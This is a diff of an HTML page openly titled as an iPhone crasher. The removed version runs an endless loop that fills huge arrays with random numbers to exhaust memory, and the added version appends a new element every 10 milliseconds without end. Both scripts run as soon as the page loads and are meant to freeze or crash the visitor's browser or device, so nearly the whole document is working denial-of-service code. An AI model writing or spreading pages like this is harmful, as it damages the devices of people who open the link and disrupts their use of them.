@@ -1,16 +1,31 @@
+<!DOCTYPE html>
 <html>
 <head>
-<title>Crash that iPhone!</title>
+<title>iOSクラッシャー</title>
+<style>
+#tabContainer {
+  display: flex;
+  overflow-x: auto;
+}
+.tab {
+  min-width: 200px;
+  padding: 10px;
+  background-color: #eee;
+  margin: 10px;
+}
+</style>
 </head>
 <body>
-<script>
-// 無限ループでメモリを消費し、iPhoneをクラッシュさせる
-while (true) {
-var array = new Array(10000000);
-for (var i = 0; i < array.length; i++) {
-array[i] = Math.random();
-}
-}
-</script>
+<div id="tabContainer">
+  <script>
+  // 無限にタブを作成
+  setInterval(() => {
+    const tab = document.createElement('div');
+    tab.className = 'tab';
+    tab.textContent = '新しいタブ';
+    document.getElementById('tabContainer').appendChild(tab);
+  }, 10);
+  </script>
+</div>
 </body>
 </html>
